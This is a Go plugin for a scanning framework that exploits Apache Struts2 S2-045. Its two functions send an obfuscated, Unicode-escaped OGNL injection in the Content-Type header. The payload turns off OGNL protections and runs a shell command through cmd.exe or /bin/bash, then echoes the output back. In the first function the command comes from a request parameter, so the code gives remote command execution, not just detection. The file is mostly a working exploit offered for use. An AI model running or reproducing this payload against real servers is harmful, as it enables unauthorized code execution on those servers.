package poc_product1

import (
	"fmt"
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/poc_register"
	"github.com/lz520520/railgunlib/pkg/templates/poc_model"
	"github.com/lz520520/railgunlib/pkg/templates/poc_templates"
	"net/url"
	"strings"
)

type Poc_VUL1 struct {
	poc_templates.PocTemplate
}

func (self *Poc_VUL1) Poc1() (pocResult poc_model.PocPerPayloadResult) {
	// 默认配置
	pocResult.Status = false
	headers := self.GetInitPocHeaders()
	// 构造payload
	metadata := goutils.RandomHexString(16)

	shellPayload := `smultipart/form-data%{\u0028\u0023\u0064\u006d\u003d\u0040\u006f\u0067\u006e\u006c\u002e\u004f\u0067\u006e\u006c\u0043\u006f\u006e\u0074\u0065\u0078\u0074\u0040\u0044\u0045\u0046\u0041\u0055\u004c\u0054\u005f\u004d\u0045\u004d\u0042\u0045\u0052\u005f\u0041\u0043\u0043\u0045\u0053\u0053\u0029\u002e\u0028\u0023\u005f\u006d\u0065\u006d\u0062\u0065\u0072\u0041\u0063\u0063\u0065\u0073\u0073\u003f\u0028\u0023\u005f\u006d\u0065\u006d\u0062\u0065\u0072\u0041\u0063\u0063\u0065\u0073\u0073\u003d\u0023\u0064\u006d\u0029\u003a\u0028\u0028\u0023\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0065\u0072\u003d\u0023\u0063\u006f\u006e\u0074\u0065\u0078\u0074\u005b\u0027\u0063\u006f\u006d\u002e\u006f\u0070\u0065\u006e\u0073\u0079\u006d\u0070\u0068\u006f\u006e\u0079\u002e\u0078\u0077\u006f\u0072\u006b\u0032\u002e\u0041\u0063\u0074\u0069\u006f\u006e\u0043\u006f\u006e\u0074\u0065\u0078\u0074\u002e\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0065\u0072\u0027\u005d\u0029\u002e\u0028\u0023\u006f\u0067\u006e\u006c\u0055\u0074\u0069\u006c\u003d\u0023\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0065\u0072\u002e\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065\u0028\u0040\u0063\u006f\u006d\u002e\u006f\u0070\u0065\u006e\u0073\u0079\u006d\u0070\u0068\u006f\u006e\u0079\u002e\u0078\u0077\u006f\u0072\u006b\u0032\u002e\u006f\u0067\u006e\u006c\u002e\u004f\u0067\u006e\u006c\u0055\u0074\u0069\u006c\u0040\u0063\u006c\u0061\u0073\u0073\u0029\u0029\u002e\u0028\u0023\u006f\u0067\u006e\u006c\u0055\u0074\u0069\u006c\u002e\u0067\u0065\u0074\u0045\u0078\u0063\u006c\u0075\u0064\u0065\u0064\u0050\u0061\u0063\u006b\u0061\u0067\u0065\u004e\u0061\u006d\u0065\u0073\u0028\u0029\u002e\u0063\u006c\u0065\u0061\u0072\u0028\u0029\u0029\u002e\u0028\u0023\u006f\u0067\u006e\u006c\u0055\u0074\u0069\u006c\u002e\u0067\u0065\u0074\u0045\u0078\u0063\u006c\u0075\u0064\u0065\u0064\u0043\u006c\u0061\u0073\u0073\u0065\u0073\u0028\u0029\u002e\u0063\u006c\u0065\u0061\u0072\u0028\u0029\u0029\u002e\u0028\u0023\u0063\u006f\u006e\u0074\u0065\u0078\u0074\u002e\u0073\u0065\u0074\u004d\u0065\u006d\u0062\u0065\u0072\u0041\u0063\u0063\u0065\u0073\u0073\u0028\u0023\u0064\u006d\u0029\u0029\u0029\u0029\u002e\u0028\u0023\u0072\u0065\u0071\u003d\u0023\u0063\u006f\u006e\u0074\u0065\u0078\u0074\u002e\u0067\u0065\u0074\u0028\u0027\u0063\u006f\u006d\u002e\u006f\u0070\u0065\u006e\u0073\u0079\u006d\u0070\u0068\u006f\u006e\u0079\u002e\u0078\u0077\u006f\u0072\u006b\u0032\u002e\u0064\u0069\u0073\u0070\u0061\u0074\u0063\u0068\u0065\u0072\u002e\u0048\u0074\u0074\u0070\u0053\u0065\u0072\u0076\u006c\u0065\u0074\u0052\u0065\u0071\u0075\u0065\u0073\u0074\u0027\u0029\u0029\u002e\u0028\u0023\u0068\u0068\u003d\u0023\u0063\u006f\u006e\u0074\u0065\u0078\u0074\u002e\u0067\u0065\u0074\u0028\u0027\u0063\u006f\u006d\u002e\u006f\u0070\u0065\u006e\u0073\u0079\u006d\u0070\u0068\u006f\u006e\u0079\u002e\u0078\u0077\u006f\u0072\u006b\u0032\u002e\u0064\u0069\u0073\u0070\u0061\u0074\u0063\u0068\u0065\u0072\u002e\u0048\u0074\u0074\u0070\u0053\u0065\u0072\u0076\u006c\u0065\u0074\u0052\u0065\u0073\u0070\u006f\u006e\u0073\u0065\u0027\u0029\u0029\u002e\u0028\u0023\u006f\u0073\u006e\u0061\u006d\u0065\u003d\u0040\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0053\u0079\u0073\u0074\u0065\u006d\u0040\u0067\u0065\u0074\u0050\u0072\u006f\u0070\u0065\u0072\u0074\u0079\u0028\u0027\u006f\u0073\u002e\u006e\u0061\u006d\u0065\u0027\u0029\u0029\u002e\u0028\u0023\u006c\u0069\u0073\u0074\u003d\u0023\u006f\u0073\u006e\u0061\u006d\u0065\u002e\u0073\u0074\u0061\u0072\u0074\u0073\u0057\u0069\u0074\u0068\u0028\u0027\u0057\u0069\u006e\u0064\u006f\u0077\u0073\u0027\u0029\u003f\u007b\u0027\u0063\u006d\u0064\u002e\u0065\u0078\u0065\u0027\u002c\u0027\u002f\u0063\u0027\u002c\u0023\u0070\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0073\u002e\u0063\u006d\u0064\u005b\u0030\u005d\u007d\u003a\u007b\u0027\u002f\u0062\u0069\u006e\u002f\u0062\u0061\u0073\u0068\u0027\u002c\u0027\u002d\u0063\u0027\u002c\u0023\u0070\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0073\u002e\u0063\u006d\u0064\u005b\u0030\u005d\u007d\u0029\u002e\u0028\u0023\u0061\u0061\u003d\u0028\u006e\u0065\u0077\u0020\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0050\u0072\u006f\u0063\u0065\u0073\u0073\u0042\u0075\u0069\u006c\u0064\u0065\u0072\u0028\u0023\u006c\u0069\u0073\u0074\u0029\u0029\u002e\u0073\u0074\u0061\u0072\u0074\u0028\u0029\u0029\u002e\u0028\u0023\u0062\u0062\u003d\u0023\u0061\u0061\u002e\u0067\u0065\u0074\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0029\u0029\u002e\u0028\u0023\u0068\u0068\u002e\u0067\u0065\u0074\u0057\u0072\u0069\u0074\u0065\u0072\u0028\u0029\u002e\u0070\u0072\u0069\u006e\u0074\u006c\u006e\u0028\u006e\u0065\u0077\u0020\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0053\u0074\u0072\u0069\u006e\u0067\u0028\u006e\u0065\u0077\u0020\u006f\u0072\u0067\u002e\u0061\u0070\u0061\u0063\u0068\u0065\u002e\u0063\u006f\u006d\u006d\u006f\u006e\u0073\u002e\u0069\u006f\u002e\u0049\u004f\u0055\u0074\u0069\u006c\u0073\u0028\u0029\u002e\u0074\u006f\u0042\u0079\u0074\u0065\u0041\u0072\u0072\u0061\u0079\u0028\u0023\u0062\u0062\u0029\u002c\u0023\u0070\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0073\u002e\u0065\u006e\u0063\u006f\u0064\u0065\u0029\u0029\u003f\u0074\u0072\u0075\u0065\u003a\u0074\u0072\u0075\u0065\u0029\u002e\u0028\u0023\u0068\u0068\u002e\u0067\u0065\u0074\u0057\u0072\u0069\u0074\u0065\u0072\u0028\u0029\u002e\u0066\u006c\u0075\u0073\u0068\u0028\u0029\u0029\u002e\u0028\u0023\u0068\u0068\u002e\u0067\u0065\u0074\u0057\u0072\u0069\u0074\u0065\u0072\u0028\u0029\u002e\u0063\u006c\u006f\u0073\u0065\u0028\u0029\u0029}`
	headers["Content-Type"] = []string{shellPayload}

	cmd := strings.ReplaceAll("echo "+metadata, " ", "+")
	cmd = url.PathEscape(cmd)
	target := strings.TrimRight(self.Params.Target, "?") + fmt.Sprintf("?&&encode=%s&cmd=%s", self.Params.Charset, cmd)

	// 发送请求
	httpresp := self.HttpGet(target, headers)
	if httpresp.Err != nil {
		return
	}
	result := httpresp.Body

	if len(result) > 20 {
		result = result[:20]
	}
	if strings.Contains(result, metadata) {
		pocResult.Status = true
	}
	return
}

func (self *Poc_VUL1) Poc2() (pocResult poc_model.PocPerPayloadResult) {
	// 默认配置
	pocResult.Status = true
	pocResult.Messages = "test"
	headers := self.GetInitPocHeaders()
	if self.Params.Cookie != "" {
		headers["Cookie"] = []string{self.Params.Cookie}
	}
	// 构造payload
	metadata := goutils.RandomHexString(16)

	shellPayload := `%{\u0028\u0023\u006e\u0069\u006b\u0065\u003d\u0027multipart/form-data\u0027\u0029\u002e\u0028\u0023\u0064\u006d\u003d\u0040\u006f\u0067\u006e\u006c\u002e\u004f\u0067\u006e\u006c\u0043\u006f\u006e\u0074\u0065\u0078\u0074\u0040\u0044\u0045\u0046\u0041\u0055\u004c\u0054\u005f\u004d\u0045\u004d\u0042\u0045\u0052\u005f\u0041\u0043\u0043\u0045\u0053\u0053\u0029\u002e\u0028\u0023\u005f\u006d\u0065\u006d\u0062\u0065\u0072\u0041\u0063\u0063\u0065\u0073\u0073\u003f\u0028\u0023\u005f\u006d\u0065\u006d\u0062\u0065\u0072\u0041\u0063\u0063\u0065\u0073\u0073\u003d\u0023\u0064\u006d\u0029\u003a\u0028\u0028\u0023\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0065\u0072\u003d\u0023\u0063\u006f\u006e\u0074\u0065\u0078\u0074\u005b\u0027\u0063\u006f\u006d\u002e\u006f\u0070\u0065\u006e\u0073\u0079\u006d\u0070\u0068\u006f\u006e\u0079\u002e\u0078\u0077\u006f\u0072\u006b\u0032\u002e\u0041\u0063\u0074\u0069\u006f\u006e\u0043\u006f\u006e\u0074\u0065\u0078\u0074\u002e\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0065\u0072\u0027\u005d\u0029\u002e\u0028\u0023\u006f\u0067\u006e\u006c\u0055\u0074\u0069\u006c\u003d\u0023\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0065\u0072\u002e\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065\u0028\u0040\u0063\u006f\u006d\u002e\u006f\u0070\u0065\u006e\u0073\u0079\u006d\u0070\u0068\u006f\u006e\u0079\u002e\u0078\u0077\u006f\u0072\u006b\u0032\u002e\u006f\u0067\u006e\u006c\u002e\u004f\u0067\u006e\u006c\u0055\u0074\u0069\u006c\u0040\u0063\u006c\u0061\u0073\u0073\u0029\u0029\u002e\u0028\u0023\u006f\u0067\u006e\u006c\u0055\u0074\u0069\u006c\u002e\u0067\u0065\u0074\u0045\u0078\u0063\u006c\u0075\u0064\u0065\u0064\u0050\u0061\u0063\u006b\u0061\u0067\u0065\u004e\u0061\u006d\u0065\u0073\u0028\u0029\u002e\u0063\u006c\u0065\u0061\u0072\u0028\u0029\u0029\u002e\u0028\u0023\u006f\u0067\u006e\u006c\u0055\u0074\u0069\u006c\u002e\u0067\u0065\u0074\u0045\u0078\u0063\u006c\u0075\u0064\u0065\u0064\u0043\u006c\u0061\u0073\u0073\u0065\u0073\u0028\u0029\u002e\u0063\u006c\u0065\u0061\u0072\u0028\u0029\u0029\u002e\u0028\u0023\u0063\u006f\u006e\u0074\u0065\u0078\u0074\u002e\u0073\u0065\u0074\u004d\u0065\u006d\u0062\u0065\u0072\u0041\u0063\u0063\u0065\u0073\u0073\u0028\u0023\u0064\u006d\u0029\u0029\u0029\u0029\u002e\u0028\u0023\u0063\u006d\u0064\u003d\u0027lz520520\u0027\u0029\u002e\u0028\u0023\u0069\u0073\u0077\u0069\u006e\u003d\u0028\u0040\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0053\u0079\u0073\u0074\u0065\u006d\u0040\u0067\u0065\u0074\u0050\u0072\u006f\u0070\u0065\u0072\u0074\u0079\u0028\u0027\u006f\u0073\u002e\u006e\u0061\u006d\u0065\u0027\u0029\u002e\u0074\u006f\u004c\u006f\u0077\u0065\u0072\u0043\u0061\u0073\u0065\u0028\u0029\u002e\u0063\u006f\u006e\u0074\u0061\u0069\u006e\u0073\u0028\u0027\u0077\u0069\u006e\u0027\u0029\u0029\u0029\u002e\u0028\u0023\u0063\u006d\u0064\u0073\u003d\u0028\u0023\u0069\u0073\u0077\u0069\u006e\u003f\u007b\u0027\u0063\u006d\u0064\u002e\u0065\u0078\u0065\u0027\u002c\u0027\u002f\u0063\u0027\u002c\u0023\u0063\u006d\u0064\u007d\u003a\u007b\u0027\u002f\u0062\u0069\u006e\u002f\u0062\u0061\u0073\u0068\u0027\u002c\u0027\u002d\u0063\u0027\u002c\u0023\u0063\u006d\u0064\u007d\u0029\u0029\u002e\u0028\u0023\u0070\u003d\u006e\u0065\u0077\u0020\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0050\u0072\u006f\u0063\u0065\u0073\u0073\u0042\u0075\u0069\u006c\u0064\u0065\u0072\u0028\u0023\u0063\u006d\u0064\u0073\u0029\u0029\u002e\u0028\u0023\u0070\u002e\u0072\u0065\u0064\u0069\u0072\u0065\u0063\u0074\u0045\u0072\u0072\u006f\u0072\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0074\u0072\u0075\u0065\u0029\u0029\u002e\u0028\u0023\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u003d\u0023\u0070\u002e\u0073\u0074\u0061\u0072\u0074\u0028\u0029\u0029\u002e\u0028\u0023\u0072\u006f\u0073\u003d\u0028\u0040\u006f\u0072\u0067\u002e\u0061\u0070\u0061\u0063\u0068\u0065\u002e\u0073\u0074\u0072\u0075\u0074\u0073\u0032\u002e\u0053\u0065\u0072\u0076\u006c\u0065\u0074\u0041\u0063\u0074\u0069\u006f\u006e\u0043\u006f\u006e\u0074\u0065\u0078\u0074\u0040\u0067\u0065\u0074\u0052\u0065\u0073\u0070\u006f\u006e\u0073\u0065\u0028\u0029\u002e\u0067\u0065\u0074\u004f\u0075\u0074\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0029\u0029\u0029\u002e\u0028\u0040\u006f\u0072\u0067\u002e\u0061\u0070\u0061\u0063\u0068\u0065\u002e\u0063\u006f\u006d\u006d\u006f\u006e\u0073\u002e\u0069\u006f\u002e\u0049\u004f\u0055\u0074\u0069\u006c\u0073\u0040\u0063\u006f\u0070\u0079\u0028\u0023\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u002e\u0067\u0065\u0074\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0029\u002c\u0023\u0072\u006f\u0073\u0029\u0029\u002e\u0028\u0023\u0072\u006f\u0073\u002e\u0066\u006c\u0075\u0073\u0068\u0028\u0029\u0029}`
	shellPayload = strings.Replace(shellPayload, "lz520520", "echo "+metadata, 1)
	headers["Content-Type"] = []string{shellPayload}

	// 发送请求
	httpresp := self.HttpGet(self.Params.Target, headers)
	if httpresp.Err != nil {
		return
	}
	result := httpresp.Body
	if len(result) > 20 {
		result = result[:20]
	}
	if strings.Contains(result, metadata) {
		pocResult.Status = true
	}
	return
}

func init() {
	registerMsg := poc_register.PocRegisterMsg{Msg: poc_model.PocMsg{
		Name:     "S2-045",
		Author:   "lz520520",
		Time:     "2017-05-05",
		Range:    "",
		ID:       "",
		Describe: "",
	},
		Proto: poc_model.PocHTTP,
	}
	poc_register.PocStructRegister(&Poc_VUL1{}, registerMsg)
}